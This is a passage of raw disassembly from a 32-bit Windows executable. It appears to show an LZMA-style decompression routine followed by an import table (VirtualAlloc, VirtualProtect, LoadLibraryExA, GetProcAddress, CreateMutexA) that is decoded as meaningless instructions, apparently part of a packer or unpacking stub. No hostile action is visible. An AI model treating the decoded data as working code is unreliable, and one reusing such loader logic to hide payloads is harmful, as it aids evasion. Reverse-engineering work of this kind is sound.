  407f4b:	8b 74 24 08          	mov    0x8(%esp),%esi
  407f4f:	57                   	push   %edi
  407f50:	8b 7c 24 10          	mov    0x10(%esp),%edi
  407f54:	57                   	push   %edi
  407f55:	56                   	push   %esi
  407f56:	e8 59 fe ff ff       	call   0x407db4
  407f5b:	85 c0                	test   %eax,%eax
  407f5d:	59                   	pop    %ecx
  407f5e:	59                   	pop    %ecx
  407f5f:	57                   	push   %edi
  407f60:	75 18                	jne    0x407f7a
  407f62:	8b 44 24 18          	mov    0x18(%esp),%eax
  407f66:	c1 e0 04             	shl    $0x4,%eax
  407f69:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  407f6d:	6a 03                	push   $0x3
  407f6f:	50                   	push   %eax
  407f70:	e8 de fe ff ff       	call   0x407e53
  407f75:	83 c4 0c             	add    $0xc,%esp
  407f78:	eb 42                	jmp    0x407fbc
  407f7a:	8d 46 02             	lea    0x2(%esi),%eax
  407f7d:	50                   	push   %eax
  407f7e:	e8 31 fe ff ff       	call   0x407db4
  407f83:	85 c0                	test   %eax,%eax
  407f85:	59                   	pop    %ecx
  407f86:	59                   	pop    %ecx
  407f87:	57                   	push   %edi
  407f88:	75 1e                	jne    0x407fa8
  407f8a:	8b 44 24 18          	mov    0x18(%esp),%eax
  407f8e:	c1 e0 04             	shl    $0x4,%eax
  407f91:	8d 84 30 04 01 00 00 	lea    0x104(%eax,%esi,1),%eax
  407f98:	6a 03                	push   $0x3
  407f9a:	50                   	push   %eax
  407f9b:	e8 b3 fe ff ff       	call   0x407e53
  407fa0:	83 c4 0c             	add    $0xc,%esp
  407fa3:	83 c0 08             	add    $0x8,%eax
  407fa6:	eb 14                	jmp    0x407fbc
  407fa8:	6a 08                	push   $0x8
  407faa:	81 c6 04 02 00 00    	add    $0x204,%esi
  407fb0:	56                   	push   %esi
  407fb1:	e8 9d fe ff ff       	call   0x407e53
  407fb6:	83 c4 0c             	add    $0xc,%esp
  407fb9:	83 c0 10             	add    $0x10,%eax
  407fbc:	5f                   	pop    %edi
  407fbd:	5e                   	pop    %esi
  407fbe:	c3                   	ret
  407fbf:	55                   	push   %ebp
  407fc0:	8b ec                	mov    %esp,%ebp
  407fc2:	83 ec 34             	sub    $0x34,%esp
  407fc5:	8b 45 10             	mov    0x10(%ebp),%eax
  407fc8:	53                   	push   %ebx
  407fc9:	56                   	push   %esi
  407fca:	57                   	push   %edi
  407fcb:	8b 7d 14             	mov    0x14(%ebp),%edi
  407fce:	8d 0c 38             	lea    (%eax,%edi,1),%ecx
  407fd1:	33 f6                	xor    %esi,%esi
  407fd3:	46                   	inc    %esi
  407fd4:	b8 00 03 00 00       	mov    $0x300,%eax
  407fd9:	d3 e0                	shl    %cl,%eax
  407fdb:	33 c9                	xor    %ecx,%ecx
  407fdd:	8b d6                	mov    %esi,%edx
  407fdf:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  407fe2:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407fe5:	89 4d 14             	mov    %ecx,0x14(%ebp)
  407fe8:	8b 4d 18             	mov    0x18(%ebp),%ecx
  407feb:	d3 e2                	shl    %cl,%edx
  407fed:	89 75 fc             	mov    %esi,-0x4(%ebp)
  407ff0:	89 75 f0             	mov    %esi,-0x10(%ebp)
  407ff3:	89 75 f4             	mov    %esi,-0xc(%ebp)
  407ff6:	89 75 e8             	mov    %esi,-0x18(%ebp)
  407ff9:	8b cf                	mov    %edi,%ecx
  407ffb:	d3 e6                	shl    %cl,%esi
  407ffd:	05 36 07 00 00       	add    $0x736,%eax
  408002:	32 db                	xor    %bl,%bl
  408004:	4a                   	dec    %edx
  408005:	4e                   	dec    %esi
  408006:	85 c0                	test   %eax,%eax
  408008:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40800b:	8b 75 08             	mov    0x8(%ebp),%esi
  40800e:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408011:	76 12                	jbe    0x408025
  408013:	8b c8                	mov    %eax,%ecx
  408015:	d1 e9                	shr    $1,%ecx
  408017:	b8 00 04 00 04       	mov    $0x4000400,%eax
  40801c:	8b fe                	mov    %esi,%edi
  40801e:	f3 ab                	rep stos %eax,%es:(%edi)
  408020:	13 c9                	adc    %ecx,%ecx
  408022:	66 f3 ab             	rep stos %ax,%es:(%edi)
  408025:	8b 45 1c             	mov    0x1c(%ebp),%eax
  408028:	8b 4d 20             	mov    0x20(%ebp),%ecx
  40802b:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  40802f:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  408033:	89 45 cc             	mov    %eax,-0x34(%ebp)
  408036:	03 c1                	add    %ecx,%eax
  408038:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  40803c:	6a 05                	push   $0x5
  40803e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  408041:	5f                   	pop    %edi
  408042:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408045:	50                   	push   %eax
  408046:	e8 f1 fc ff ff       	call   0x407d3c
  40804b:	59                   	pop    %ecx
  40804c:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40804f:	0f b6 c0             	movzbl %al,%eax
  408052:	c1 e1 08             	shl    $0x8,%ecx
  408055:	0b c1                	or     %ecx,%eax
  408057:	4f                   	dec    %edi
  408058:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40805b:	75 e5                	jne    0x408042
  40805d:	8b 45 2c             	mov    0x2c(%ebp),%eax
  408060:	21 38                	and    %edi,(%eax)
  408062:	39 7d 28             	cmp    %edi,0x28(%ebp)
  408065:	0f 86 9b 02 00 00    	jbe    0x408306
  40806b:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40806e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408071:	23 45 14             	and    0x14(%ebp),%eax
  408074:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408077:	51                   	push   %ecx
  408078:	8b cf                	mov    %edi,%ecx
  40807a:	c1 e1 04             	shl    $0x4,%ecx
  40807d:	03 c8                	add    %eax,%ecx
  40807f:	89 45 18             	mov    %eax,0x18(%ebp)
  408082:	8d 04 4e             	lea    (%esi,%ecx,2),%eax
  408085:	50                   	push   %eax
  408086:	e8 29 fd ff ff       	call   0x407db4
  40808b:	85 c0                	test   %eax,%eax
  40808d:	59                   	pop    %ecx
  40808e:	59                   	pop    %ecx
  40808f:	0f 85 8a 00 00 00    	jne    0x40811f
  408095:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408098:	23 55 14             	and    0x14(%ebp),%edx
  40809b:	6a 08                	push   $0x8
  40809d:	59                   	pop    %ecx
  40809e:	2a 4d 10             	sub    0x10(%ebp),%cl
  4080a1:	0f b6 c3             	movzbl %bl,%eax
  4080a4:	d3 e8                	shr    %cl,%eax
  4080a6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4080a9:	d3 e2                	shl    %cl,%edx
  4080ab:	03 c2                	add    %edx,%eax
  4080ad:	69 c0 00 06 00 00    	imul   $0x600,%eax,%eax
  4080b3:	83 ff 04             	cmp    $0x4,%edi
  4080b6:	8d 84 30 6c 0e 00 00 	lea    0xe6c(%eax,%esi,1),%eax
  4080bd:	7d 06                	jge    0x4080c5
  4080bf:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4080c3:	eb 10                	jmp    0x4080d5
  4080c5:	83 ff 0a             	cmp    $0xa,%edi
  4080c8:	7d 05                	jge    0x4080cf
  4080ca:	83 ef 03             	sub    $0x3,%edi
  4080cd:	eb 03                	jmp    0x4080d2
  4080cf:	83 ef 06             	sub    $0x6,%edi
  4080d2:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4080d5:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4080d9:	74 25                	je     0x408100
  4080db:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4080de:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  4080e1:	8b 55 24             	mov    0x24(%ebp),%edx
  4080e4:	8a 0c 11             	mov    (%ecx,%edx,1),%cl
  4080e7:	88 4d 08             	mov    %cl,0x8(%ebp)
  4080ea:	ff 75 08             	push   0x8(%ebp)
  4080ed:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4080f0:	51                   	push   %ecx
  4080f1:	50                   	push   %eax
  4080f2:	e8 f2 fd ff ff       	call   0x407ee9
  4080f7:	83 c4 0c             	add    $0xc,%esp
  4080fa:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  4080fe:	eb 0c                	jmp    0x40810c
  408100:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408103:	51                   	push   %ecx
  408104:	50                   	push   %eax
  408105:	e8 bb fd ff ff       	call   0x407ec5
  40810a:	59                   	pop    %ecx
  40810b:	59                   	pop    %ecx
  40810c:	8a d8                	mov    %al,%bl
  40810e:	8b 45 24             	mov    0x24(%ebp),%eax
  408111:	8b 4d 14             	mov    0x14(%ebp),%ecx
  408114:	ff 45 14             	incl   0x14(%ebp)
  408117:	88 1c 01             	mov    %bl,(%ecx,%eax,1)
  40811a:	e9 db 01 00 00       	jmp    0x4082fa
  40811f:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408122:	50                   	push   %eax
  408123:	33 db                	xor    %ebx,%ebx
  408125:	8d 84 7e 80 01 00 00 	lea    0x180(%esi,%edi,2),%eax
  40812c:	43                   	inc    %ebx
  40812d:	50                   	push   %eax
  40812e:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  408131:	e8 7e fc ff ff       	call   0x407db4
  408136:	3b c3                	cmp    %ebx,%eax
  408138:	59                   	pop    %ecx
  408139:	59                   	pop    %ecx
  40813a:	0f 85 c9 00 00 00    	jne    0x408209
  408140:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408143:	50                   	push   %eax
  408144:	8d 84 7e 98 01 00 00 	lea    0x198(%esi,%edi,2),%eax
  40814b:	50                   	push   %eax
  40814c:	e8 63 fc ff ff       	call   0x407db4
  408151:	59                   	pop    %ecx
  408152:	85 c0                	test   %eax,%eax
  408154:	59                   	pop    %ecx
  408155:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408158:	50                   	push   %eax
  408159:	75 33                	jne    0x40818e
  40815b:	8d 47 0f             	lea    0xf(%edi),%eax
  40815e:	c1 e0 04             	shl    $0x4,%eax
  408161:	03 45 18             	add    0x18(%ebp),%eax
  408164:	8d 04 46             	lea    (%esi,%eax,2),%eax
  408167:	50                   	push   %eax
  408168:	e8 47 fc ff ff       	call   0x407db4
  40816d:	85 c0                	test   %eax,%eax
  40816f:	59                   	pop    %ecx
  408170:	59                   	pop    %ecx
  408171:	75 67                	jne    0x4081da
  408173:	8b 4d 14             	mov    0x14(%ebp),%ecx
  408176:	83 ff 07             	cmp    $0x7,%edi
  408179:	0f 9d c0             	setge  %al
  40817c:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  40817f:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  408183:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408186:	8b 45 24             	mov    0x24(%ebp),%eax
  408189:	8a 1c 01             	mov    (%ecx,%eax,1),%bl
  40818c:	eb 83                	jmp    0x408111
  40818e:	8d 84 7e b0 01 00 00 	lea    0x1b0(%esi,%edi,2),%eax
  408195:	50                   	push   %eax
  408196:	e8 19 fc ff ff       	call   0x407db4
  40819b:	85 c0                	test   %eax,%eax
  40819d:	59                   	pop    %ecx
  40819e:	59                   	pop    %ecx
  40819f:	75 05                	jne    0x4081a6
  4081a1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4081a4:	eb 2b                	jmp    0x4081d1
  4081a6:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4081a9:	50                   	push   %eax
  4081aa:	8d 84 7e c8 01 00 00 	lea    0x1c8(%esi,%edi,2),%eax
  4081b1:	50                   	push   %eax
  4081b2:	e8 fd fb ff ff       	call   0x407db4
  4081b7:	85 c0                	test   %eax,%eax
  4081b9:	59                   	pop    %ecx
  4081ba:	59                   	pop    %ecx
  4081bb:	75 05                	jne    0x4081c2
  4081bd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4081c0:	eb 09                	jmp    0x4081cb
  4081c2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4081c5:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4081c8:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4081cb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4081ce:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4081d1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4081d4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4081d7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4081da:	ff 75 18             	push   0x18(%ebp)
  4081dd:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4081e0:	50                   	push   %eax
  4081e1:	8d 86 68 0a 00 00    	lea    0xa68(%esi),%eax
  4081e7:	50                   	push   %eax
  4081e8:	e8 5d fd ff ff       	call   0x407f4a
  4081ed:	8b d0                	mov    %eax,%edx
  4081ef:	33 c0                	xor    %eax,%eax
  4081f1:	83 c4 0c             	add    $0xc,%esp
  4081f4:	83 ff 07             	cmp    $0x7,%edi
  4081f7:	0f 9d c0             	setge  %al
  4081fa:	48                   	dec    %eax
  4081fb:	83 e0 fd             	and    $0xfffffffd,%eax
  4081fe:	83 c0 0b             	add    $0xb,%eax
  408201:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408204:	e9 c8 00 00 00       	jmp    0x4082d1
  408209:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40820c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40820f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408212:	ff 75 18             	push   0x18(%ebp)
  408215:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408218:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40821b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40821e:	33 c0                	xor    %eax,%eax
  408220:	83 ff 07             	cmp    $0x7,%edi
  408223:	0f 9d c0             	setge  %al
  408226:	48                   	dec    %eax
  408227:	83 e0 fd             	and    $0xfffffffd,%eax
  40822a:	83 c0 0a             	add    $0xa,%eax
  40822d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408230:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408233:	50                   	push   %eax
  408234:	8d 86 64 06 00 00    	lea    0x664(%esi),%eax
  40823a:	50                   	push   %eax
  40823b:	e8 0a fd ff ff       	call   0x407f4a
  408240:	83 c4 0c             	add    $0xc,%esp
  408243:	83 f8 04             	cmp    $0x4,%eax
  408246:	89 45 18             	mov    %eax,0x18(%ebp)
  408249:	7c 03                	jl     0x40824e
  40824b:	6a 03                	push   $0x3
  40824d:	58                   	pop    %eax
  40824e:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  408251:	51                   	push   %ecx
  408252:	c1 e0 07             	shl    $0x7,%eax
  408255:	8d 84 30 60 03 00 00 	lea    0x360(%eax,%esi,1),%eax
  40825c:	6a 06                	push   $0x6
  40825e:	50                   	push   %eax
  40825f:	e8 ef fb ff ff       	call   0x407e53
  408264:	83 c4 0c             	add    $0xc,%esp
  408267:	83 f8 04             	cmp    $0x4,%eax
  40826a:	7c 59                	jl     0x4082c5
  40826c:	8b c8                	mov    %eax,%ecx
  40826e:	8b f8                	mov    %eax,%edi
  408270:	23 fb                	and    %ebx,%edi
  408272:	d1 f9                	sar    $1,%ecx
  408274:	49                   	dec    %ecx
  408275:	83 cf 02             	or     $0x2,%edi
  408278:	d3 e7                	shl    %cl,%edi
  40827a:	83 f8 0e             	cmp    $0xe,%eax
  40827d:	7d 1b                	jge    0x40829a
  40827f:	8d 55 cc             	lea    -0x34(%ebp),%edx
  408282:	52                   	push   %edx
  408283:	51                   	push   %ecx
  408284:	8b cf                	mov    %edi,%ecx
  408286:	2b c8                	sub    %eax,%ecx
  408288:	8d 84 4e 5e 05 00 00 	lea    0x55e(%esi,%ecx,2),%eax
  40828f:	50                   	push   %eax
  408290:	e8 f5 fb ff ff       	call   0x407e8a
  408295:	83 c4 0c             	add    $0xc,%esp
  408298:	eb 27                	jmp    0x4082c1
  40829a:	83 c1 fc             	add    $0xfffffffc,%ecx
  40829d:	51                   	push   %ecx
  40829e:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4082a1:	50                   	push   %eax
  4082a2:	e8 b0 fa ff ff       	call   0x407d57
  4082a7:	c1 e0 04             	shl    $0x4,%eax
  4082aa:	03 f8                	add    %eax,%edi
  4082ac:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4082af:	50                   	push   %eax
  4082b0:	8d 86 44 06 00 00    	lea    0x644(%esi),%eax
  4082b6:	6a 04                	push   $0x4
  4082b8:	50                   	push   %eax
  4082b9:	e8 cc fb ff ff       	call   0x407e8a
  4082be:	83 c4 14             	add    $0x14,%esp
  4082c1:	03 f8                	add    %eax,%edi
  4082c3:	eb 05                	jmp    0x4082ca
  4082c5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4082c8:	8b f8                	mov    %eax,%edi
  4082ca:	8b 55 18             	mov    0x18(%ebp),%edx
  4082cd:	47                   	inc    %edi
  4082ce:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4082d1:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4082d5:	74 2f                	je     0x408306
  4082d7:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4082da:	8b 7d 24             	mov    0x24(%ebp),%edi
  4082dd:	8b c1                	mov    %ecx,%eax
  4082df:	2b 45 fc             	sub    -0x4(%ebp),%eax
  4082e2:	42                   	inc    %edx
  4082e3:	42                   	inc    %edx
  4082e4:	03 c7                	add    %edi,%eax
  4082e6:	8a 18                	mov    (%eax),%bl
  4082e8:	88 1c 39             	mov    %bl,(%ecx,%edi,1)
  4082eb:	41                   	inc    %ecx
  4082ec:	40                   	inc    %eax
  4082ed:	4a                   	dec    %edx
  4082ee:	85 d2                	test   %edx,%edx
  4082f0:	89 4d 14             	mov    %ecx,0x14(%ebp)
  4082f3:	7e 05                	jle    0x4082fa
  4082f5:	3b 4d 28             	cmp    0x28(%ebp),%ecx
  4082f8:	72 ec                	jb     0x4082e6
  4082fa:	8b 45 14             	mov    0x14(%ebp),%eax
  4082fd:	3b 45 28             	cmp    0x28(%ebp),%eax
  408300:	0f 82 65 fd ff ff    	jb     0x40806b
  408306:	8b 45 14             	mov    0x14(%ebp),%eax
  408309:	8b 4d 2c             	mov    0x2c(%ebp),%ecx
  40830c:	5f                   	pop    %edi
  40830d:	5e                   	pop    %esi
  40830e:	89 01                	mov    %eax,(%ecx)
  408310:	33 c0                	xor    %eax,%eax
  408312:	5b                   	pop    %ebx
  408313:	c9                   	leave
  408314:	c3                   	ret
  408315:	cc                   	int3
  408316:	cc                   	int3
  408317:	cc                   	int3
  408318:	54                   	push   %esp
  408319:	83 00 00             	addl   $0x0,(%eax)
	...
  408324:	34 84                	xor    $0x84,%al
  408326:	00 00                	add    %al,(%eax)
  408328:	24 70                	and    $0x70,%al
  40832a:	00 00                	add    %al,(%eax)
  40832c:	80 83 00 00 00 00 00 	addb   $0x0,0x0(%ebx)
  408333:	00 00                	add    %al,(%eax)
  408335:	00 00                	add    %al,(%eax)
  408337:	00 50 84             	add    %dl,-0x7c(%eax)
  40833a:	00 00                	add    %al,(%eax)
  40833c:	50                   	push   %eax
  40833d:	70 00                	jo     0x40833f
	...
  408353:	00 88 83 00 00 96    	add    %cl,-0x69ffff7d(%eax)
  408359:	83 00 00             	addl   $0x0,(%eax)
  40835c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40835d:	83 00 00             	addl   $0x0,(%eax)
  408360:	b6 83                	mov    $0x83,%dh
  408362:	00 00                	add    %al,(%eax)
  408364:	c6 83 00 00 d4 83 00 	movb   $0x0,-0x7c2c0000(%ebx)
  40836b:	00 e6                	add    %ah,%dh
  40836d:	83 00 00             	addl   $0x0,(%eax)
  408370:	f8                   	clc
  408371:	83 00 00             	addl   $0x0,(%eax)
  408374:	0c 84                	or     $0x84,%al
  408376:	00 00                	add    %al,(%eax)
  408378:	1e                   	push   %ds
  408379:	84 00                	test   %al,(%eax)
  40837b:	00 00                	add    %al,(%eax)
  40837d:	00 00                	add    %al,(%eax)
  40837f:	00 42 84             	add    %al,-0x7c(%edx)
  408382:	00 00                	add    %al,(%eax)
  408384:	00 00                	add    %al,(%eax)
  408386:	00 00                	add    %al,(%eax)
  408388:	83 03 56             	addl   $0x56,(%ebx)
  40838b:	69 72 74 75 61 6c 46 	imul   $0x466c6175,0x74(%edx),%esi
  408392:	72 65                	jb     0x4083f9
  408394:	65 00 81 03 56 69 72 	add    %al,%gs:0x72695603(%ecx)
  40839b:	74 75                	je     0x408412
  40839d:	61                   	popa
  40839e:	6c                   	insb   (%dx),%es:(%edi)
  40839f:	41                   	inc    %ecx
  4083a0:	6c                   	insb   (%dx),%es:(%edi)
  4083a1:	6c                   	insb   (%dx),%es:(%edi)
  4083a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a3:	63 00                	arpl   %eax,(%eax)
  4083a5:	00 71 01             	add    %dh,0x1(%ecx)
  4083a8:	47                   	inc    %edi
  4083a9:	65 74 4c             	gs je  0x4083f8
  4083ac:	61                   	popa
  4083ad:	73 74                	jae    0x408423
  4083af:	45                   	inc    %ebp
  4083b0:	72 72                	jb     0x408424
  4083b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b3:	72 00                	jb     0x4083b5
  4083b5:	00 60 00             	add    %ah,0x0(%eax)
  4083b8:	43                   	inc    %ebx
  4083b9:	72 65                	jb     0x408420
  4083bb:	61                   	popa
  4083bc:	74 65                	je     0x408423
  4083be:	4d                   	dec    %ebp
  4083bf:	75 74                	jne    0x408435
  4083c1:	65 78 41             	gs js  0x408405
  4083c4:	00 00                	add    %al,(%eax)
  4083c6:	b9 00 45 78 69       	mov    $0x69784500,%ecx
  4083cb:	74 50                	je     0x40841d
  4083cd:	72 6f                	jb     0x40843e
  4083cf:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083d2:	73 00                	jae    0x4083d4
  4083d4:	a0 01 47 65 74       	mov    0x74654701,%al
  4083d9:	50                   	push   %eax
  4083da:	72 6f                	jb     0x40844b
  4083dc:	63 41 64             	arpl   %eax,0x64(%ecx)
  4083df:	64 72 65             	fs jb  0x408447
  4083e2:	73 73                	jae    0x408457
  4083e4:	00 00                	add    %al,(%eax)
  4083e6:	53                   	push   %ebx
  4083e7:	02 4c 6f 61          	add    0x61(%edi,%ebp,2),%cl
  4083eb:	64 4c                	fs dec %esp
  4083ed:	69 62 72 61 72 79 45 	imul   $0x45797261,0x72(%edx),%esp
  4083f4:	78 41                	js     0x408437
  4083f6:	00 00                	add    %al,(%eax)
  4083f8:	7f 01                	jg     0x4083fb
  4083fa:	47                   	inc    %edi
  4083fb:	65 74 4d             	gs je  0x40844b
  4083fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4083ff:	64 75 6c             	fs jne 0x40846e
  408402:	65 48                	gs dec %eax
  408404:	61                   	popa
  408405:	6e                   	outsb  %ds:(%esi),(%dx)
  408406:	64 6c                	fs insb (%dx),%es:(%edi)
  408408:	65 41                	gs inc %ecx
  40840a:	00 00                	add    %al,(%eax)
  40840c:	86 03                	xchg   %al,(%ebx)
  40840e:	56                   	push   %esi
  40840f:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  408416:	72 6f                	jb     0x408487
  408418:	74 65                	je     0x40847f
  40841a:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  40841e:	7d 01                	jge    0x408421
  408420:	47                   	inc    %edi
  408421:	65 74 4d             	gs je  0x408471
  408424:	6f                   	outsl  %ds:(%esi),(%dx)
  408425:	64 75 6c             	fs jne 0x408494
  408428:	65 46                	gs inc %esi
  40842a:	69 6c 65 4e 61 6d 65 	imul   $0x41656d61,0x4e(%ebp,%eiz,2),%ebp
  408431:	41 
  408432:	00 00                	add    %al,(%eax)
  408434:	4b                   	dec    %ebx
  408435:	45                   	inc    %ebp
  408436:	52                   	push   %edx
  408437:	4e                   	dec    %esi
  408438:	45                   	inc    %ebp
  408439:	4c                   	dec    %esp
  40843a:	33 32                	xor    (%edx),%esi
  40843c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40843f:	6c                   	insb   (%dx),%es:(%edi)
  408440:	00 00                	add    %al,(%eax)
  408442:	df 01                	filds  (%ecx)
  408444:	4d                   	dec    %ebp
  408445:	65 73 73             	gs jae 0x4084bb
  408448:	61                   	popa
  408449:	67 65 42             	addr16 gs inc %edx
  40844c:	6f                   	outsl  %ds:(%esi),(%dx)
  40844d:	78 41                	js     0x408490
  40844f:	00 55 53             	add    %dl,0x53(%ebp)
  408452:	45                   	inc    %ebp
  408453:	52                   	push   %edx
  408454:	33 32                	xor    (%edx),%esi
  408456:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408459:	6c                   	insb   (%dx),%es:(%edi)
  40845a:	00 00                	add    %al,(%eax)
  40845c:	08 01                	or     %al,(%ecx)
	...
  4084b6:	00 00                	add    %al,(%eax)
  4084b8:	00 50 00             	add    %dl,0x0(%eax)
  4084bb:	00 cd                	add    %cl,%ch
  4084bd:	0f 00 00             	sldt   (%eax)
  4084c0:	00 04 00             	add    %al,(%eax,%eax,1)
  4084c3:	00 00                	add    %al,(%eax)
  4084c5:	60                   	pusha
  4084c6:	00 00                	add    %al,(%eax)
  4084c8:	30 21                	xor    %ah,(%ecx)
  4084ca:	00 00                	add    %al,(%eax)
  4084cc:	01 00                	add    %eax,(%eax)
  4084ce:	00 00                	add    %al,(%eax)
  4084d0:	42                   	inc    %edx
  4084d1:	74 00                	je     0x4084d3
  4084d3:	00 00                	add    %al,(%eax)
  4084d5:	00 40 00             	add    %al,0x0(%eax)
  4084d8:	00 00                	add    %al,(%eax)
  4084da:	00 00                	add    %al,(%eax)
  4084dc:	0f 01 00             	sgdtl  (%eax)
  4084df:	00 e0                	add    %ah,%al
  4084e1:	32 00                	xor    (%eax),%al
  4084e3:	00 00                	add    %al,(%eax)
  4084e5:	00 00                	add    %al,(%eax)
  4084e7:	00 00                	add    %al,(%eax)
  4084e9:	50                   	push   %eax
	...
  4084fa:	00 00                	add    %al,(%eax)
  4084fc:	9a 8d 01 00 03 00 00 	lcall  $0x0,$0x300018d
  408503:	00 01                	add    %al,(%ecx)
  408505:	00 00                	add    %al,(%eax)
  408507:	00 00                	add    %al,(%eax)
  408509:	04 00                	add    $0x0,%al
  40850b:	00 58 0a             	add    %bl,0xa(%eax)
  40850e:	00 00                	add    %al,(%eax)
  408510:	00 10                	add    %dl,(%eax)
  408512:	00 00                	add    %al,(%eax)
  408514:	22 14 00             	and    (%eax,%eax,1),%dl
  408517:	00 20                	add    %ah,(%eax)
  408519:	00 00                	add    %al,(%eax)
  40851b:	60                   	pusha
  40851c:	01 00                	add    %eax,(%eax)
  40851e:	00 00                	add    %al,(%eax)
  408520:	58                   	pop    %eax
  408521:	0e                   	push   %cs
  408522:	00 00                	add    %al,(%eax)
  408524:	69 04 00 00 00 30 00 	imul   $0x300000,(%eax,%eax,1),%eax
  40852b:	00 aa 07 00 00 40    	add    %ch,0x40000007(%edx)
  408531:	00 00                	add    %al,(%eax)
  408533:	40                   	inc    %eax
  408534:	01 00                	add    %eax,(%eax)
  408536:	00 00                	add    %al,(%eax)
  408538:	c1 12 00             	rcll   $0x0,(%edx)
  40853b:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40853e:	00 00                	add    %al,(%eax)
  408540:	00 40 00             	add    %al,0x0(%eax)
  408543:	00 60 01             	add    %ah,0x1(%eax)
  408546:	00 00                	add    %al,(%eax)
  408548:	40                   	inc    %eax
  408549:	00 00                	add    %al,(%eax)
  40854b:	c0 00 00             	rolb   $0x0,(%eax)
	...
